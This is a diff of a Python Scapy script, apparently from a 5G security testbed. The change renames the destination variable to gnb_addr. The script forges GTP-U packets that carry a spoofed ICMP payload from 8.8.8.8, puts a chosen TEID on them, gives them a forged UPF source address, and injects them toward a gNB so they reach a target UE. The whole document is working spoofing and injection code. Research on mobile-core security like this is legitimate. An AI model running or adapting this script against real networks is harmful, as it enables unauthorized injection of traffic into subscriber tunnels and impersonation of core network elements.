@@ -17,7 +17,7 @@ teid = int(sys.argv[1], 0)
 src_ip = "10.100.200.66"
 spoofed_ip = "8.8.8.8"
 ue_ip = sys.argv[2]
-ue_real_ip = "10.100.200.14"
+gnb_addr = "10.100.200.14"
 upf_ip = "10.100.200.2"
 dport = 2152
 
@@ -32,7 +32,7 @@ ip_payload = IP(src=spoofed_ip, dst=ue_ip) / ICMP(type=8, id=0x1234, seq=1) / b"
 
 gtpu_header = GTP_U_Header(teid=teid) / ip_payload
 
-packet = IP(src=upf_ip, dst=ue_real_ip) / UDP(dport=dport, sport=RandShort()) / gtpu_header
+packet = IP(src=upf_ip, dst=gnb_addr) / UDP(dport=dport, sport=RandShort()) / gtpu_header
 
 logger.info(f"Sending GTP-U packet with TEID {hex(teid)} to {ue_ip} through the upf ({upf_ip})")
 
@@ -40,3 +40,4 @@ logger.info(f"Sending GTP-U packet with TEID {hex(teid)} to {ue_ip} through the 
 send(packet)
 
 logger.success("Packet sent successfully")
+
